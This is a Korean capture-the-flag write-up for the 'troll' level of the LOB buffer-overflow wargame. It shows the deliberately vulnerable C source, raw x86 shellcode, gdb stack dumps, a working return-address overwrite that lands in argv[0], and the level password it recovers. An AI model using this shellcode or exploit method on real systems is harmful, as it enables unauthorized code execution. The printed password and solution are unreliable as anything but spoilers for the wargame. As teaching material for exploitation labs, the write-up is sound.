============================================================================================================
[redhat-lob] (8) troll
============================================================================================================

.. graphviz::

    digraph foo {
        a -> b -> c -> d -> a;

        a [shape=box, label="dummy * 19 + shellcode + (argv[0] address+4*i)"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="(argv[0] address+4*i)"];
    }

|

Source Code
============================================================================================================

.. code-block:: c

	#include <stdio.h>
	#include <stdlib.h>

	extern char **environ;

	main(int argc, char *argv[])
	{
		char buffer[40];
		int i;

		// here is changed
		if(argc != 2){
			printf("argc must be two!\n");
			exit(0);
		}

		// egghunter
		for(i=0; environ[i]; i++)
			memset(environ[i], 0, strlen(environ[i]));

		if(argv[1][47] != '\xbf')
		{
			printf("stack is still your friend.\n");
			exit(0);
		}

		// check the length of argument
		if(strlen(argv[1]) > 48){
			printf("argument is too long!\n");
			exit(0);
		}

		strcpy(buffer, argv[1]);
		printf("%s\n", buffer);

		// buffer hunter
		memset(buffer, 0, 40);

		// one more!
		memset(argv[1], 0, strlen(argv[1]));
	}


|

Vulnerabliity Vector
============================================================================================================

main 함수의 ret를 덮어씌워 오버플로우를 발생시킨다.

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================


|

Buffer Overflow
============================================================================================================

Overflow condition 

- environ을 초기화하여 환경 변수 사용를 통한 쉘코드 삽입이 불가능하다.
- argv[1] 값의 47번째 문자가 "\\xbf"이어야 함
- argv[1] 값의 길이가 48 미만 이어야 함
- argv[1] 값을 초기화하여 argv[1] 주소로 버퍼오버플로우를 진행할 수 없다.


.. code-block:: console

	※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2

	$ ./troll `python -c 'print "a"*47'`
	stack is still your friend.

	$ ./troll `python -c 'print "a"*47+"\xbf"'`
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
	Segmentation fault




|

exploit
============================================================================================================

기존 문제와 달리 argv[1] 값을 초기화 해버리기 때문에 argv[1] 주소로 버퍼오버플로우를 진행할 수 없음.
argv[0] 값에 쉘코드를 삽입하고, RET 주소를 argv[0] 주소로 변경하여야 한다.

argv[0] 값에 쉘코드 삽입
------------------------------------------------------------------------------------------------------------

기존에 사용한 쉘코드에는 "\\x2f" 값이 있기 때문에 정상적으로 쉘코드가 동작하지 않는다.

"\\x2f"가 없는 쉘코드로 파일명을 생성하도록 한다.

.. code-block:: console
	
	$ ln troll `python -c 'print "\x90"*100 + "\xd9\xc5\xd9\x74\x24\xf4\xb8\x15\xc3\x69\xd7\x5d\x29\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\xe0\xa9\x62\x8f\x93\x7c\x13\x47\x8e\xe3\x52\x70\xb8\xcc\x17\x17\x38\x7b\xf7\x85\x51\x15\x8e\xa9\xf3\x01\x98\x2d\xf3\xd1\xb6\x4f\x9a\xbf\xe7\xfc\x34\x40\xaf\x51\x4d\xa1\x82\xd6"'`
	$ ls
	troll
	troll.c    
	????????????????????????????????????????????????????????????????????????????????????????????????????▒▒▒t$▒?▒i▒])ɱ?1E??E??▒?▒▒b??|?G?▒Rp▒▒??8{▒?Q??▒▒??-▒ѶO?▒▒▒4@▒QM▒?▒
	$ ./`python -c 'print "\x90"*100 + "\xd9\xc5\xd9\x74\x24\xf4\xb8\x15\xc3\x69\xd7\x5d\x29\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\xe0\xa9\x62\x8f\x93\x7c\x13\x47\x8e\xe3\x52\x70\xb8\xcc\x17\x17\x38\x7b\xf7\x85\x51\x15\x8e\xa9\xf3\x01\x98\x2d\xf3\xd1\xb6\x4f\x9a\xbf\xe7\xfc\x34\x40\xaf\x51\x4d\xa1\x82\xd6"'` a

	stack is still your friend.


앞의 조건에 argv[1] 값을  초기화하기 때문에, gdb를 이용하여 argv[0] 주소를 찾는다.

.. code-block:: console

	(gdb) b *main
	Breakpoint 1 at 0x8048500

	(gdb) r `python -c 'print "a"*47+"\xbf"'`
	Starting program: /home/orge/▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒t$▒▒i▒])ɱ
							  1EE▒▒▒▒b▒▒|G▒▒Rp▒▒8{▒Q▒▒▒▒-▒ѶO▒▒▒▒4@▒QM▒▒▒ `python -c 'print "a"*47+"\xbf"'`
	/bin/bash: /home/goblin/.bashrc: Permission denied

	Breakpoint 1, 0x8048500 in main ()

	(gdb) stepi
	0x8048501 in main ()    

	(gdb) i reg $esp
	esp            0xbffff9a8       -1073743448

	(gdb) i reg $ebp
	ebp            0xbffff9c8       -1073743416

	(gdb) x/100x $esp

	==========================================================================
	0xbffff9a8:     0xbffff9c8      0x400309cb      0x00000002      0xbffff9f4
	0xbffff9b8:     0xbffffa00      0x40013868      0x00000002      0x08048450
	0xbffff9c8:     0x00000000      0x08048471      0x08048500      0x00000002
	0xbffff9d8:     0xbffff9f4      0x08048390      0x0804866c      0x4000ae60
	0xbffff9e8:     0xbffff9ec      0x40013e90      0x00000002      0xbffffae7
	0xbffff9f8:     0xbffffb9d      0x00000000      0xbffffbce      0xbffffbf0
	0xbffffa08:     0xbffffbfa      0xbffffc08      0xbffffc27      0xbffffc34
	0xbffffa18:     0xbffffc4d      0xbffffc69      0xbffffc88      0xbffffc93
	0xbffffa28:     0xbffffca1      0xbffffce3      0xbffffcf3      0xbffffd08
	0xbffffa38:     0xbffffd18      0xbffffd22      0xbffffd40      0xbffffd4b
	0xbffffa48:     0xbffffd5c      0xbffffd6b      0xbffffd7a      0xbffffd83
	0xbffffa58:     0x00000000      0x00000003      0x08048034      0x00000004
	0xbffffa68:     0x00000020      0x00000005      0x00000006      0x00000006
	0xbffffa78:     0x00001000      0x00000007      0x40000000      0x00000008
	0xbffffa88:     0x00000000      0x00000009      0x08048450      0x0000000b
	0xbffffa98:     0x000001fb      0x0000000c      0x000001fb      0x0000000d
	0xbffffaa8:     0x000001fb      0x0000000e      0x000001fb      0x00000010
	0xbffffab8:     0x0fabfbff      0x0000000f      0xbffffae2      0x00000000
	0xbffffac8:     0x00000000      0x00000000      0x00000000      0x00000000
	0xbffffad8:     0x00000000      0x00000000      0x36690000      0x2f003638
	0xbffffae8:     0x656d6f68      0x67726f2f      0x90902f65      0x90909090
	0xbffffaf8:     0x90909090      0x90909090      0x90909090      0x90909090
	0xbffffb08:     0x90909090      0x90909090      0x90909090      0x90909090
	0xbffffb18:     0x90909090      0x90909090      0x90909090      0x90909090
	0xbffffb28:     0x90909090      0x90909090      0x90909090      0x90909090
	0xbffffb38:     0x90909090      0x90909090      0x90909090      0x90909090
	0xbffffb48:     0x90909090      0x90909090      0x90909090      0xc5d99090
	0xbffffb58:     0xf42474d9      0x69c315b8      0xc9295dd7      0x45310bb1
	0xbffffb68:     0x1a45031a      0xe204c583      0x8f62a9e0      0x47137c93
	0xbffffb78:     0x7052e38e      0x1717ccb8      0x85f77b38      0xa98e1551
	0xbffffb88:     0x2d9801f3      0x4fb6d1f3      0xfce7bf9a      0x51af4034
	0xbffffb98:     0xd682a14d      0x61616100      0x61616161      0x61616161
                                          ^               ^               ^	
	0xbffffba8:     0x61616161      0x61616161      0x61616161      0x61616161
                          ^               ^               ^               ^
	0xbffffbb8:     0x61616161      0x61616161      0x61616161      0x61616161
                          ^               ^ argv[0] = 0xbffffbbf
	==========================================================================

|

argv[0] pointers 쉘코드 실행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ==============================
    LOW     
    ------------------------------
    local variables of main
    saved registers of main
    return address of main <<- overflow
    argc
    argv
    envp
    stack from startup code
    argc
    argv pointers ->> shellcode
    NULL that ends argv[]
    environment pointers
    NULL that ends envp[]
    ELF Auxiliary Table
    argv strings
    environment strings
    program name
    NULL
    ------------------------------
    HIGH (0xC0000000)    
    ==============================

|

오버플로우시 RET를 argv[0] 주소로 덮어씌워 해당 쉘코드가 실행되도록 한다. argv[0] 주소의 최초 주소 값을 확인하여 4바이트씩 증가하면서 주소를 변경하면서 공격을 진행하면 성공시킬 수 있다.


.. code-block:: console

	$ ./`python -c 'print "\x90"*100 + "\xd9\xc5\xd9\x74\x24\xf4\xb8\x15\xc3\x69\xd7\x5d\x29\xc9\xb1\x0b\x31\x45\x1a\x03\x45\x1a\x83\xc5\x04\xe2\xe0\xa9\x62\x8f\x93\x7c\x13\x47\x8e\xe3\x52\x70\xb8\xcc\x17\x17\x38\x7b\xf7\x85\x51\x15\x8e\xa9\xf3\x01\x98\x2d\xf3\xd1\xb6\x4f\x9a\xbf\xe7\xfc\x34\x40\xaf\x51\x4d\xa1\x82\xd6"'` `python -c 'print "\x90"*44 + "\xbf\xfb\xff\xbf"'`
	▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
										   ̀▒▒▒▒

	bash$ whoami
	troll
	bash$ my-pass
	euid = 508
	aspirin
